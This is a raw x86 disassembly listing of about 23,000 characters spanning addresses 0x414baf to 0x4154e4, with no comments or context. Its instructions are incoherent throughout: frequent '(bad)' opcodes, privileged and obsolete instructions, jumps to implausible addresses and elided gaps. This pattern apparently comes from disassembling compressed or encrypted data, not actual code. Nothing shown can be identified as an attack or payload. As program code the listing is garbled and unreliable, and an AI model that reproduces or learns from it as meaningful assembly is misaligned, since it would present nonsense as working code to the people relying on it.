  414baf:	add    ecx,DWORD PTR [esp+ebx*1+0x655bbbf8]
  414bb6:	fild   WORD PTR [ebx]
  414bb8:	push   ebx
  414bb9:	bswap  edi
  414bbb:	pop    es
  414bbc:	mov    WORD PTR [eax+ebp*2-0x206f9762],ss
  414bc3:	add    edi,DWORD PTR [ebx-0x73fca097]
  414bc9:	xchg   esp,eax
  414bca:	push   edx
  414bcb:	sbb    al,0xd
  414bcd:	clc    
  414bce:	add    ebx,DWORD PTR [esi+ecx*4]
  414bd1:	sbb    DWORD PTR [ebx],edi
  414bd3:	sub    BYTE PTR [edx+eax*8+0x7a],dh
  414bd7:	int    0x24
  414bd9:	lock enter 0x9fc,0xc5
  414bde:	sbb    eax,0xe752655f
  414be3:	add    edi,DWORD PTR [ebx+0x69]
  414be6:	fild   WORD PTR [esi]
  414be8:	mov    WORD PTR [ecx+edx*1-0x3c2f4cf8],ss
  414bef:	sbb    esp,DWORD PTR [ebx+0x69]
  414bf2:	fistp  QWORD PTR [esi-0x74]
  414bf5:	xchg   esp,eax
  414bf6:	icebp  
  414bf7:	push   0xffffffab
  414bf9:	ror    bl,1
  414bfb:	sbb    edx,DWORD PTR ds:0x5e1bc3c0
  414c01:	sbb    DWORD PTR [ebp+0x6e6b83eb],edx
  414c07:	cld    
	...
  414c1c:	push   ecx
  414c1d:	(bad)  
  414c1e:	mov    ah,0x58
  414c20:	into   
  414c21:	fild   WORD PTR [edx]
  414c24:	loop   0x414bad
  414c26:	jmp    0x414c2b
  414c28:	mov    edi,ds
  414c2a:	call   0xebc556b7
  414c2f:	add    ecx,DWORD PTR [ebp+ecx*1-0x675890f8]
  414c36:	or     cl,ch
  414c38:	iret   
  414c39:	sbb    esp,DWORD PTR [esi+0x8948405]
  414c3f:	jo     0x414c52
  414c41:	test   DWORD PTR [ecx+ebp*8],ecx
  414c44:	(bad)  
  414c45:	or     eax,0x9493f18e
  414c4a:	or     BYTE PTR [ecx],bl
  414c4c:	scas   eax,DWORD PTR es:[edi]
  414c4d:	arpl   WORD PTR [ebx+0x89493dd],si
  414c53:	jl     0x414bfb
  414c55:	or     eax,0x9493d98e
  414c5a:	or     BYTE PTR [eax+0xe],dh
  414c5d:	jge    0x414c6b
  414c5f:	jmp    0x87c120f3
  414c64:	test   BYTE PTR [eax+0x1b08e908],bl
  414c6a:	sbb    ch,ch
  414c6c:	(bad)  
  414c6d:	xchg   esp,eax
  414c6e:	and    DWORD PTR [edi-0x58],0xdfe90898
  414c75:	mov    ah,0x81
  414c77:	adc    eax,0x725a7cac
  414c7c:	(bad)  
  414c7d:	ins    BYTE PTR es:[edi],dx
  414c7e:	fsub   QWORD PTR [ecx+0x0]
	...
  414c94:	out    0x61,eax
  414c96:	push   ebp
  414c97:	aaa    
  414c98:	inc    ebp
  414c99:	mov    ebp,0xd8fe1ca
  414c9e:	dec    esp
  414c9f:	int    0xd3
  414ca1:	push   cs
  414ca2:	cwde   
  414ca3:	jmp    0xb336afdf
  414ca8:	sbb    BYTE PTR [ecx-0x157016f4],bl
  414cae:	(bad)  
  414cb0:	add    DWORD PTR [ecx-0x627016f4],edx
  414cb6:	(bad)  
  414cb7:	fisttp WORD PTR [ebp+ebp*4-0x6b73d439]
  414cbe:	and    DWORD PTR [eax],eax
  414cc0:	fs xchg ebp,eax
  414cc2:	or     BYTE PTR [eax+0x74],ch
  414cc5:	xchg   edi,eax
  414cc6:	retf   0x7504
  414cc9:	stos   BYTE PTR es:[edi],al
  414cca:	enter  0x71c2,0x97
  414cce:	xchg   esp,ebp
  414cd0:	jne    0x414c9c
  414cd2:	pop    ecx
  414cd3:	mov    ebx,DWORD PTR [ecx]
  414cd5:	sub    DWORD PTR [eax],0x56
  414cd8:	inc    esi
  414cd9:	inc    edx
  414cda:	jg     0x414ccd
  414cdc:	and    dl,BYTE PTR [eax]
  414cde:	push   esp
  414cdf:	and    al,0x35
  414ce1:	adc    BYTE PTR [esp+0x2d],dl
  414ce5:	mov    al,ds:0x973108a6
  414cea:	or     BYTE PTR [edi],cl
  414cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ced:	cmp    ecx,DWORD PTR [eax]
  414cef:	add    BYTE PTR ds:0x118cff72,ah
  414cf5:	or     DWORD PTR [eax],0x0
	...
  414d0c:	xor    eax,0x91648197
  414d11:	cwde   
  414d12:	jg     0x414c9a
  414d14:	and    DWORD PTR [ebx-0xb],esp
  414d17:	(bad)  
  414d18:	js     0x414d29
  414d1a:	or     BYTE PTR [eax-0xc],ch
  414d1d:	xchg   esi,eax
  414d1e:	das    
  414d1f:	enter  0x87c3,0x7f
  414d23:	mov    ?,ecx
  414d25:	(bad)  
  414d26:	cmc    
  414d27:	(bad)  
  414d28:	out    dx,al
  414d29:	push   edi
  414d2a:	jle    0x414d30
  414d2c:	into   
  414d2d:	push   edi
  414d2e:	fisttp WORD PTR [ebx]
  414d30:	into   
  414d31:	push   edi
  414d32:	or     DWORD PTR [eax],eax
  414d34:	jge    0x414ccf
  414d36:	or     bl,ch
  414d38:	mov    bh,0xa9
  414d3a:	enter  0x2b8b,0x8f
  414d3e:	or     al,0x0
  414d40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d41:	lea    edi,[esi+0x4d24ba11]
  414d47:	add    DWORD PTR [esi],ebx
  414d49:	rcr    DWORD PTR [esi+0xdf68c04],cl
  414d4f:	mov    al,BYTE PTR [edi]
  414d51:	xchg   ebx,eax
  414d52:	or     DWORD PTR [ebx+ecx*1],0xffffffe6
  414d56:	xchg   DWORD PTR [eax],ecx
  414d58:	nop
  414d59:	imul   ecx,DWORD PTR [ecx],0xd
  414d5c:	cmp    bh,BYTE PTR [edx+eax*1]
  414d5f:	mov    dh,0xcc
  414d61:	ins    BYTE PTR es:[edi],dx
  414d62:	xchg   BYTE PTR [edx+ebx*1+0x70],cl
  414d66:	xchg   BYTE PTR [esi+0x97790],dl
  414d6c:	adc    eax,0xb78c60
	...
  414d81:	add    BYTE PTR [eax],al
  414d83:	add    BYTE PTR [ebp-0x72fff695],cl
  414d89:	jmp    0x6bcd5183
  414d8e:	or     al,0x8e
  414d90:	xchg   esp,eax
  414d91:	outs   dx,DWORD PTR ds:[esi]
  414d92:	or     DWORD PTR [eax],eax
  414d94:	pop    es
  414d95:	cli    
  414d96:	cmc    
  414d97:	add    ecx,DWORD PTR [ebx+ebp*2-0xe88377c]
  414d9e:	add    BYTE PTR [esp+ecx*4],al
  414da1:	imul   ecx,DWORD PTR [edx+0x9d38cf7],0x0
  414da8:	call   0xf570:0x12874172
  414daf:	inc    DWORD PTR [ebx]
  414db1:	gs lahf 
  414db3:	or     BYTE PTR [eax+0xe0d096b],dl
  414db9:	xchg   bh,ch
  414dbb:	std    
  414dbc:	jmp    0x414da4
  414dbe:	dec    eax
  414dbf:	and    al,0x9c
  414dc1:	lds    ecx,FWORD PTR [eiz*2-0x3dcb9473]
  414dc8:	pop    edx
  414dc9:	jno    0x414d4d
  414dcb:	push   esp
  414dcc:	jo     0x414de9
  414dce:	in     al,0x7
  414dd0:	pmulhuw mm1,QWORD PTR [ecx]
  414dd3:	or     eax,0x93612
  414dd8:	mov    WORD PTR [esi+edi*8-0x196bb04f],ss
  414ddf:	mov    cl,0x57
  414de1:	xchg   ebx,eax
  414de2:	push   0x40
  414de4:	adc    bl,BYTE PTR [ecx+0x386a]
	...
  414dfa:	add    BYTE PTR [eax],al
  414dfc:	add    al,0x9e
  414dfe:	dec    edx
  414dff:	or     DWORD PTR [eax],edx
  414e01:	and    eax,0xd8c03e0
  414e06:	ins    DWORD PTR es:[edi],dx
  414e07:	and    al,0x90
  414e09:	xchg   esp,eax
  414e0a:	fild   WORD PTR [esi+0x40269188]
  414e10:	mov    al,0x80
  414e12:	fisttp WORD PTR [ebx]
  414e14:	mov    WORD PTR [edx+ebx*8+0x6a9edebe],ss
  414e1b:	stc    
  414e1c:	xchg   ebp,eax
  414e1d:	pop    ebp
  414e1e:	jae    0x414e4f
  414e20:	pop    ss
  414e21:	sbb    edi,ebx
  414e23:	imul   eax,DWORD PTR [ebx+0x61],0xffffffba
  414e27:	adc    DWORD PTR [eax-0x45fc2068],0x98817a7c
  414e31:	cwde   
  414e32:	fild   WORD PTR [ebx]
  414e34:	gs pop esp
  414e36:	push   ebp
  414e37:	add    BYTE PTR [ebp+0x5c],ah
  414e3a:	retf   0x6507
  414e3d:	pop    esp
  414e3e:	pusha  
  414e3f:	ror    BYTE PTR [esp+ebp*8-0x6a0afc20],0xf2
  414e47:	clc    
  414e48:	add    eax,0x34376a9a
  414e4d:	pavgw  mm1,QWORD PTR [eax]
  414e50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e51:	push   edi
  414e52:	adc    cl,ah
  414e54:	fwait
  414e55:	enter  0x27c3,0x62
  414e59:	cwde   
  414e5a:	push   0xcab0a84f
  414e5f:	cld    
	...
  414e74:	cdq    
  414e75:	sbb    BYTE PTR [ecx],dl
  414e77:	add    ecx,DWORD PTR [esp+edx*4-0x6be79bf8]
  414e7e:	or     cl,ch
  414e80:	(bad)  
  414e81:	or     eax,ebx
  414e83:	adc    bl,al
  414e85:	sbb    BYTE PTR [ebp+eax*1+0x7c],al
  414e89:	fwait
  414e8a:	inc    esp
  414e8b:	or     eax,0x138d8f64
  414e90:	(bad)  
  414e91:	xchg   esp,eax
  414e92:	or     BYTE PTR [edx-0x2d],dh
  414e95:	mov    eax,0x5f937318
  414e9a:	das    
  414e9b:	popf   
  414e9c:	xchg   edx,eax
  414e9d:	xchg   esp,eax
  414e9e:	sbb    DWORD PTR [ebp-0x144e776d],0x9508948f
  414ea8:	mov    ebx,DWORD PTR [ebp+0x605bcd86]
  414eae:	cmc    
  414eaf:	(bad)  
  414eb1:	dec    edx
  414eb2:	or     cl,ch
  414eb4:	(bad)  
  414eb5:	or     eax,0x9d7fc55c
  414eba:	sar    BYTE PTR [edx+0x6e],cl
  414ebd:	or     eax,DWORD PTR [ebx-0x15]
  414ec0:	add    BYTE PTR [ebp+0x21],ch
  414ec3:	push   ebp
  414ec4:	ins    BYTE PTR es:[edi],dx
  414ec5:	lods   al,BYTE PTR ds:[esi]
  414ec6:	and    BYTE PTR ds:0xe8329495,0x9c
  414ecd:	xchg   esi,eax
  414ece:	dec    ecx
  414ecf:	sub    BYTE PTR [edi+0x3a],dl
  414ed2:	jp     0x414e8f
  414ed4:	pop    ss
  414ed5:	shr    DWORD PTR [edx*8+0x0],1
	...
  414eec:	push   ss
  414eed:	icebp  
  414eee:	sub    al,0x1
  414ef0:	mov    bh,0x3a
  414ef2:	add    eax,0x894e965
  414ef7:	jmp    0xf96e0fa2
  414efc:	jno    0x414ed7
  414efe:	pop    ecx
  414eff:	cmp    BYTE PTR [edi],al
  414f01:	dec    edi
  414f02:	loopne 0x414f5f
  414f04:	(bad)  
  414f05:	popa   
  414f06:	cmc    
  414f07:	add    BYTE PTR [esi],bh
  414f09:	int3   
  414f0a:	sub    al,0x10
  414f0c:	les    ebp,FWORD PTR ds:[eax+ebx*1]
  414f10:	xchg   esp,eax
  414f11:	ret    0xce7f
  414f14:	cs jo  0x414ef7
  414f17:	lahf   
  414f18:	das    
  414f19:	repz sub edi,DWORD PTR [di]
  414f1d:	or     eax,DWORD PTR [esp-0x67]
  414f21:	xchg   edx,eax
  414f22:	loope  0x414edc
  414f24:	bnd ja 0x414ef3
  414f27:	dec    esi
  414f28:	retf   0x7f6d
  414f2b:	ins    BYTE PTR es:[edi],dx
  414f2c:	mov    DWORD PTR [eax+0xa67fab5],esi
  414f32:	retf   0xcdc1
  414f35:	xchg   DWORD PTR [edi],eax
  414f37:	ret    0x9f76
  414f3a:	sub    al,0x10
  414f3c:	outs   dx,BYTE PTR ds:[esi]
  414f3d:	cmp    edi,DWORD PTR [esi+0x6]
  414f40:	in     al,dx
  414f41:	int3   
  414f42:	sub    al,0x18
  414f44:	mov    cs,edx
  414f46:	das    
  414f47:	mov    ds,WORD PTR [ecx+0x5f]
  414f4a:	cmc    
  414f4b:	(bad)  
  414f4c:	mov    eax,0x5157a1
	...
  414f61:	add    BYTE PTR [eax],al
  414f63:	add    BYTE PTR [esi+0x3f63e056],ch
  414f69:	repz mov bp,WORD PTR [ecx-0x4c]
  414f6e:	sbb    BYTE PTR [ebx+0x244c0a3d],cl
  414f74:	sbb    eax,0xf38b58c5
  414f79:	push   0x58
  414f7b:	cli    
  414f7c:	shl    BYTE PTR [ebp+0x7f],cl
  414f7f:	enter  0x4d9e,0x7f
  414f83:	ins    BYTE PTR es:[edi],dx
  414f84:	mov    DWORD PTR [eax+0x2d0fabb0],esi
  414f8a:	and    dh,bh
  414f8c:	cld    
  414f8d:	or     edx,eax
  414f8f:	sar    esp,0x85
  414f92:	pop    es
  414f93:	retf   0x6a8c
  414f96:	ret    0x4039
  414f99:	pop    ecx
  414f9a:	sbb    DWORD PTR [edx-0x68],esi
  414f9d:	loop   0x414fe4
  414f9f:	and    al,0x98
  414fa1:	in     al,0x45
  414fa3:	and    al,0x94
  414fa5:	hlt    
  414fa6:	pop    ebp
  414fa7:	and    al,0x9c
  414fa9:	shl    BYTE PTR [esi+0x0],0x34
  414fad:	ins    BYTE PTR es:[edi],dx
  414fae:	or     DWORD PTR [ecx],edi
  414fb0:	or     bh,BYTE PTR [ecx-0xb]
  414fb3:	call   FWORD PTR [ebx+0xa89113e]
  414fb9:	inc    ecx
  414fba:	cmc    
  414fbb:	dec    DWORD PTR [ebx-0x77890b6d]
  414fc1:	xor    ah,0xe9
  414fc4:	mov    BYTE PTR [edx+0x7ff4],dl
	...
  414fda:	add    BYTE PTR [eax],al
  414fdc:	dec    ebx
  414fdd:	ins    BYTE PTR es:[edi],dx
  414fde:	popa   
  414fdf:	jmp    FWORD PTR [ebx-0x7d]
  414fe2:	pop    es
  414fe3:	xor    DWORD PTR [ebx-0x1d],esp
  414fe6:	or     ecx,DWORD PTR [ecx-0x797d3b68]
  414fec:	lods   al,BYTE PTR ds:[esi]
  414fed:	ja     0x414ff8
  414fef:	add    BYTE PTR [edi+0x686c8aae],cl
  414ff5:	aas    
  414ff6:	or     al,0x74
  414ff8:	sahf   
  414ff9:	lock dec BYTE PTR ds:0xfdfbae09
  415000:	sub    eax,DWORD PTR [ebx+0x4]
  415003:	xchg   eax,edx
  415005:	xchg   edi,eax
  415006:	adc    al,0x87
  415008:	mov    eax,0xc8891c8f
  41500d:	xchg   edi,eax
  41500e:	sub    BYTE PTR [ecx-0x76e370a0],cl
  415014:	push   eax
  415015:	xchg   edi,eax
  415016:	adc    al,0x5d
  415018:	pop    edx
  415019:	mov    BYTE PTR [ecx+0x4f48850],al
  41501f:	pop    ecx
  415020:	setne  BYTE PTR [ebx-0x207b31ec]
  415027:	sub    al,0x9c
  41502a:	bound  edi,QWORD PTR [eax-0x58]
  41502d:	fcomp  st(7)
  41502f:	dec    ebp
  415030:	adc    eax,0x7d0af464
  415035:	push   esp
  415036:	adc    eax,0xa19cd081
  41503b:	sbb    al,0x8c
  41503d:	or     DWORD PTR [ebx],ebp
  41503f:	and    BYTE PTR [eax],al
	...
  415051:	add    BYTE PTR [eax],al
  415053:	add    BYTE PTR [edi+edx*1+0x1f],cl
  415057:	outs   dx,DWORD PTR ds:[esi]
  415058:	xchg   esi,eax
  415059:	adc    DWORD PTR [edi],esi
  41505b:	cmc    
  41505c:	cmp    dl,BYTE PTR [ecx]
  41505e:	and    edi,DWORD PTR [esi+ecx*8]
  415061:	jl     0x415042
  415063:	mov    al,bl
  415065:	mov    eax,0xe84b7ea3
  41506a:	inc    ebp
  41506b:	mov    eax,esp
  41506d:	mov    eax,0xe85e7eab
  415072:	dec    ebp
  415073:	mov    edx,DWORD PTR [edx]
  415075:	mov    bl,ah
  415077:	add    ecx,DWORD PTR [esp+ecx*8-0x67538188]
  41507e:	fild   WORD PTR [ebx]
  415080:	or     ecx,DWORD PTR [esi]
  415082:	out    dx,eax
  415083:	dec    DWORD PTR [ebx+0x5d]
  415086:	inc    edi
  415087:	out    0x45,al
  415089:	outs   dx,BYTE PTR ds:[esi]
  41508a:	pop    edx
  41508b:	xor    DWORD PTR [ebx-0x3b],edx
  41508e:	out    dx,al
  41508f:	lods   eax,DWORD PTR ds:[esi]
  415090:	sti    
  415091:	xchg   ebx,eax
  415092:	scas   eax,DWORD PTR es:[edi]
  415093:	inc    edx
  415094:	mov    WORD PTR [ebx-0x61],es
  415097:	xor    BYTE PTR [ecx-0x73],cl
  41509a:	popf   
  41509b:	mov    edx,0x420ad1b
  4150a0:	inc    ebx
  4150a1:	push   esp
  4150a2:	adc    bh,BYTE PTR [ebp+0x1882699]
  4150a8:	mov    esp,0xccd2dfd3
  4150ad:	mov    al,ds:0x2688ae08
  4150b2:	scas   eax,DWORD PTR es:[edi]
  4150b3:	jmp    0x0:0xb8089d9f
	...
  4150ca:	add    BYTE PTR [eax],al
  4150cc:	iret   
  4150cd:	adc    al,bh
  4150cf:	in     eax,0x9c
  4150d1:	push   edi
  4150d2:	xchg   DWORD PTR [eax-0x160aa271],edx
  4150d8:	cmp    eax,0x88a98b55
  4150dd:	adc    DWORD PTR [ecx+0x59948ff0],esi
  4150e3:	pusha  
  4150e4:	or     DWORD PTR [ecx],0x520ee546
  4150ea:	adc    BYTE PTR [ecx-0x1649a35e],cl
  4150f0:	mov    ss,WORD PTR [eax+ecx*1+0x5c5d3764]
  4150f7:	pusha  
  4150f8:	sahf   
  4150f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150fa:	enter  0x8fec,0x94
  4150fe:	or     cl,ch
  415100:	add    al,0xb4
  415102:	int    0xad
  415104:	jb     0x415162
  415106:	cmc    
  415107:	jmp    0x29cae59b
  41510c:	arpl   WORD PTR [edi-0x6b701af8],bx
  415112:	jp     0x415119
  415114:	push   cs
  415115:	push   edi
  415116:	or     ch,ah
  415118:	(bad)  
  415119:	xchg   esp,eax
  41511a:	mov    DWORD PTR [eax],ebp
  41511c:	inc    ebx
  41511d:	lods   eax,DWORD PTR ds:[esi]
  41511e:	icebp  
  41511f:	je     0x41516a
  415121:	push   cs
  415122:	xchg   ch,bl
  415124:	xor    ebx,DWORD PTR [ebp+esi*8+0x62]
  415128:	cdq    
  415129:	adc    eax,0x12a1e6c0
  41512e:	sub    al,0xe5
	...
  415144:	(bad)  
  415145:	xchg   esp,eax
  415146:	jg     0x4151af
  415148:	adc    BYTE PTR [eax-0x57716f8],bl
  41514e:	or     eax,DWORD PTR [eax]
  415150:	icebp  
  415151:	xchg   edi,eax
  415152:	or     BYTE PTR [ecx+0xc947b],cl
  415158:	in     eax,0xd8
  41515a:	xor    cl,BYTE PTR [ebx+0xc7c4b]
  415160:	cmc    
  415161:	ficomp DWORD PTR [esi+0x897f110]
  415167:	mov    DWORD PTR [ebx],edi
  415169:	js     0x415177
  41516b:	add    BYTE PTR [ebp+0x71890dd9],dh
  415171:	lods   al,BYTE PTR ds:[esi]
  415172:	adc    al,0x8b
  415174:	jno    0x415122
  415176:	pop    esp
  415177:	mov    BYTE PTR [edi-0x4eeb6970],ch
  41517d:	xchg   edi,eax
  41517e:	or     BYTE PTR [ecx],al
  415180:	or     eax,DWORD PTR [ecx-0x605afff4]
  415186:	lea    edi,[ecx+eax*4-0x80]
  41518a:	lea    edi,[ecx+edx*4-0x78]
  41518e:	lea    ebx,[esi+0x89369]
  415194:	cld    
  415195:	les    ebp,FWORD PTR [eax+ebx*2]
  415198:	jle    0x4151ec
  41519a:	add    eax,DWORD PTR [esi+0x88fa6]
  4151a0:	fmul   DWORD PTR [ebx]
  4151a2:	or     BYTE PTR [eax],al
  4151a4:	gs xchg edi,eax
  4151a6:	jg     0x4151ec
	...
  4151bc:	inc    ecx
  4151bd:	retf   
  4151be:	mov    eax,eax
  4151c0:	and    DWORD PTR [ecx-0x70aeb381],ebp
  4151c6:	xor    eax,0x10b2e989
  4151cb:	test   BYTE PTR [ebp+ebx*8+0x21],ch
  4151cf:	mov    eax,DWORD PTR [ecx]
  4151d1:	mov    bl,0x68
  4151d3:	mov    ebx,DWORD PTR [ebx+0x25000c87]
  4151d9:	jp     0x41521f
  4151db:	and    al,0x8c
  4151dd:	popf   
  4151de:	pop    esi
  4151df:	mov    DWORD PTR [edx],esp
  4151e1:	popa   
  4151e2:	or     eax,0x50868c00
  4151e7:	and    al,0x5c
  4151e9:	jl     0x415260
  4151eb:	dec    esp
  4151ec:	test   al,0x81
  4151ee:	pop    esi
  4151ef:	dec    edi
  4151f0:	jmp    0x4151ee
  4151f2:	(bad)  
  4151f3:	les    edi,FWORD PTR [eax+ebp*8-0x37]
  4151f7:	or     eax,0x18010
  4151fc:	mov    WORD PTR [esi+0x45],es
  4151ff:	and    al,0xa8
  415201:	sbb    BYTE PTR [esi],0x89
  415204:	xor    BYTE PTR [ecx+0x4d],cl
  415207:	mov    DWORD PTR [eax+0x51],esp
  41520a:	dec    ecx
  41520b:	xchg   DWORD PTR [eax],esp
  41520d:	dec    ecx
  41520e:	adc    eax,0x11514087
  415213:	jmp    0x248f389b
  415218:	inc    eax
  415219:	out    0x87,al
  41521b:	adc    al,0x88
  41521d:	ins    DWORD PTR es:[edi],dx
  41521e:	or     DWORD PTR [ecx],ebp
	...
  415234:	dec    edi
  415235:	sbb    al,0x5e
  415237:	dec    edi
  415238:	adc    eax,edi
  41523a:	sub    al,0x34
  41523c:	fsubrp st(6),st
  41523e:	(bad)  
  41523f:	call   0xfe3bf953
  415244:	pop    ss
  415245:	sbb    BYTE PTR ds:0xbb10f2c,ch
  41524b:	or     eax,0xd208
  415250:	mov    esi,?
  415252:	jg     0x415278
  415254:	nop
  415255:	imul   ecx,DWORD PTR [ecx],0xffffffc5
  415258:	enter  0x1d47,0x0
  41525c:	mov    WORD PTR [ebx+0x9],gs
  41525f:	aaa    
  415260:	enter  0x1147,0x73
  415264:	scas   al,BYTE PTR es:[edi]
  415265:	out    dx,al
  415266:	cli    
  415267:	call   DWORD PTR [edx-0x72a99a6c]
  41526d:	xchg   esp,eax
  41526e:	fild   QWORD PTR [edx]
  415270:	enter  0x17b0,0x1
  415274:	adc    ch,cl
  415276:	loop   0x41527b
  415278:	mov    WORD PTR ds:0xc19c2823,cs
  41527e:	sbb    dl,cl
  415280:	pop    ebp
  415281:	les    ebp,FWORD PTR [edx-0x3e]
  415284:	hlt    
  415285:	jbe    0x415242
  415287:	icebp  
  415288:	loope  0x415297
  41528a:	cmp    ebp,DWORD PTR [eax]
  41528c:	xchg   esp,eax
  41528d:	shl    DWORD PTR [eax],0x7d
  415290:	ret    0xb70d
  415293:	fadd   QWORD PTR [eax]
  415295:	bound  eax,QWORD PTR [esi+0xf1]
	...
  4152ab:	add    BYTE PTR [ebp-0x688101ab],al
  4152b1:	xchg   ebp,eax
  4152b2:	fild   WORD PTR [ebx]
  4152b4:	add    eax,0x672bc3d1
  4152b9:	xchg   esp,eax
  4152ba:	in     al,dx
  4152bb:	add    ecx,DWORD PTR [eax+ebx*8-0x69667b08]
  4152c2:	out    0x87,al
  4152c4:	mov    edx,DWORD PTR [ebp-0x6b38fc21]
  4152ca:	les    eax,FWORD PTR [ebx]
  4152cc:	mov    eax,ds
  4152ce:	clc    
  4152cf:	test   BYTE PTR [ecx-0x6b],bh
  4152d2:	out    0x87,al
  4152d4:	jnp    0x41526c
  4152d6:	fild   WORD PTR [ebx]
  4152d8:	adc    eax,0x154c0bb8
  4152dd:	rol    bl,1
  4152df:	push   edi
  4152e0:	add    eax,0x8c07fb02
  4152e5:	xchg   esp,eax
  4152e6:	retf   0x13c4
  4152e9:	ror    bl,1
  4152eb:	and    edx,esp
  4152ed:	les    edi,FWORD PTR [ebp+edi*1+0x3b]
  4152f1:	les    esp,FWORD PTR [ecx+0x8d00755]
  4152f7:	int    0x6b
  4152f9:	les    eax,FWORD PTR [ecx-0xdc7bfe1]
  4152ff:	out    0x1c,al
  415301:	or     eax,DWORD PTR [ebp+eax*1+0x70]
  415305:	mov    eax,ds:0xd500d44
  41530a:	dec    ecx
  41530b:	call   0xe56e2396
	...
  415324:	(bad)  
  415325:	fsubr  DWORD PTR [edi]
  415327:	jb     0x415307
  415329:	lds    eax,FWORD PTR [ecx-0x2303859]
  41532f:	scas   al,BYTE PTR es:[edi]
  415330:	fmul   QWORD PTR [edx]
  415332:	inc    esp
  415333:	int    0x4f
  415335:	adc    DWORD PTR [ebp+eax*8-0x55],ecx
  415339:	or     ecx,DWORD PTR [ebp+ecx*8+0x53]
  41533d:	les    edx,FWORD PTR [edi+0x62]
  415340:	int    0x6b
  415342:	and    eax,0x8156bc7e
  415347:	sub    eax,0xa121b064
  41534c:	nop
  41534d:	push   ecx
  41534e:	mov    al,0xb0
  415350:	or     eax,0xb65e3073
  415355:	dec    eax
  415356:	bnd jb 0x415322
  415359:	sbb    al,ah
  41535b:	not    BYTE PTR [eax+0x119e152]
  415361:	leave  
  415362:	sub    al,0x15
  415364:	fisttp WORD PTR ds:0x617651c6
  41536a:	cmc    
  41536b:	ss call 0xe0e68031
  415371:	cmp    al,0x81
  415373:	lods   eax,DWORD PTR ds:[esi]
  415374:	mov    bl,0xd4
  415376:	pop    edx
  415377:	mov    ecx,0x1fe046d0
  41537c:	inc    ebp
  41537d:	pop    edx
  41537e:	cmc    
  41537f:	ret    0xe57
  415382:	leave  
  415383:	add    BYTE PTR [esi+0x582cc7],bh
	...
  415399:	add    BYTE PTR [eax],al
  41539b:	add    BYTE PTR [eax+edx*1+0x523603ea],ch
  4153a2:	mov    ch,0xf8
  4153a4:	aaa    
  4153a5:	xchg   ecx,eax
  4153a6:	dec    esp
  4153a7:	and    al,0x69
  4153a9:	stos   DWORD PTR es:[edi],eax
  4153aa:	loopne 0x415429
  4153ac:	sbb    eax,0x9244c4f
  4153b1:	xchg   ecx,eax
  4153b2:	or     BYTE PTR [eax],al
  4153b4:	cmc    
  4153b5:	or     al,0xf3
  4153b7:	jbe    0x415346
  4153b9:	test   eax,0xe4a92464
  4153be:	cmp    BYTE PTR [ebx+0x5520acb1],cl
  4153c4:	test   bl,bl
  4153c6:	(bad)  
  4153c7:	call   0x34b23f
  4153cc:	pop    esi
  4153cd:	mov    esp,0x482e442c
  4153d2:	jg     0x415418
  4153d4:	leave  
  4153d5:	rcr    DWORD PTR [edx+0x50],cl
  4153d8:	ds push ss
  4153da:	loopne 0x415387
  4153dc:	cmp    esp,DWORD PTR [edi-0xd]
  4153df:	cmp    esi,esi
  4153e1:	fist   DWORD PTR [esp+0x7d]
  4153e5:	in     eax,0x0
  4153e7:	(bad)  
  4153e8:	jmp    0xa542709c
  4153ed:	xchg   ebx,eax
  4153ee:	or     BYTE PTR [ebp+0x3941dde2],al
  4153f4:	inc    ecx
  4153f5:	scas   eax,DWORD PTR es:[edi]
  4153f6:	dec    esp
  4153f7:	jge    0x415423
  4153f9:	fiadd  DWORD PTR [esi+0x8936914]
  4153ff:	push   0x0
	...
  415411:	add    BYTE PTR [eax],al
  415413:	add    BYTE PTR [edx+eax*8+0x45],dh
  415417:	mov    eax,DWORD PTR [ebx-0x4d0c6cc8]
  41541d:	addr16 jg 0x415474
  415420:	dec    ecx
  415421:	iret   
  415422:	jg     0x4153fc
  415424:	mov    edx,?
  415426:	inc    eax
  415427:	and    al,0xcc
  415429:	sbb    ebx,DWORD PTR [ecx-0x77]
  41542c:	dec    edx
  41542d:	test   DWORD PTR [edi-0xa],esp
  415430:	xor    edx,DWORD PTR [esi+0x72]
  415433:	dec    esp
  415434:	jo     0x41548b
  415436:	push   eax
  415437:	dec    edi
  415438:	pop    ss
  415439:	ja     0x4153c2
  41543b:	pop    esp
  41543c:	je     0x4154aa
  41543e:	rcr    DWORD PTR [edx+ebx*1+0x36],1
  415442:	out    0x39,al
  415444:	in     al,0xf1
  415446:	inc    ebp
  415447:	and    al,0x64
  415449:	(bad)  
  41544a:	repnz les edx,FWORD PTR [eax-0x77]
  41544e:	adc    BYTE PTR [eax],al
  415450:	mov    WORD PTR [ebp+0x9],gs
  415453:	jmp    0x24a73eef
  415458:	js     0x4154c7
  41545a:	test   BYTE PTR [edx+0x969ca],0xf
  415461:	clc    
  415462:	push   es
  415463:	or     eax,0xcd21a
  415468:	mov    edx,?
  41546a:	pop    ebp
  41546b:	and    al,0x6c
  41546d:	loop   0x4153fa
  41546f:	adc    al,0x88
  415471:	ins    DWORD PTR es:[edi],dx
  415472:	or     DWORD PTR [ecx-0x7ea82132],eax
	...
  41548c:	iret   
  41548d:	push   0x5a
  41548f:	or     esp,0x408b596a
  415495:	xchg   ecx,eax
  415496:	cmp    BYTE PTR [edi+0x17],cl
  415499:	scas   al,BYTE PTR es:[edi]
  41549a:	rcl    DWORD PTR [eax-0x7619387b],1
  4154a0:	rol    BYTE PTR [edi-0x7037c6c4],1
  4154a6:	adc    al,0x89
  4154a8:	rol    BYTE PTR [edi+0x76175230],0x59
  4154af:	jl     0x415460
  4154b1:	xchg   esp,eax
  4154b2:	pop    ss
  4154b3:	lock pop edi
  4154b5:	push   esi
  4154b6:	push   ss
  4154b7:	jp     0x41551d
  4154b9:	or     ah,BYTE PTR [ebx-0x50408bd9]
  4154bf:	jp     0x41550b
  4154c1:	ins    DWORD PTR es:[edi],dx
  4154c2:	sbb    eax,0xda5631f8
  4154c7:	ret    0x1203
  4154ca:	add    DWORD PTR [edx],eax
  4154cc:	lea    edx,[edx+0x6a]
  4154cf:	mov    ebx,0xd8e15bdb
  4154d4:	data16 ins BYTE PTR es:[edi],dx
  4154d6:	leave  
  4154d7:	test   DWORD PTR [ecx],0x15cc6a56
  4154dd:	ror    DWORD PTR [ebx],1
  4154df:	sbb    al,0x5f
  4154e1:	les    edi,FWORD PTR [edx-0x42]
  4154e4:	in     al,0x49
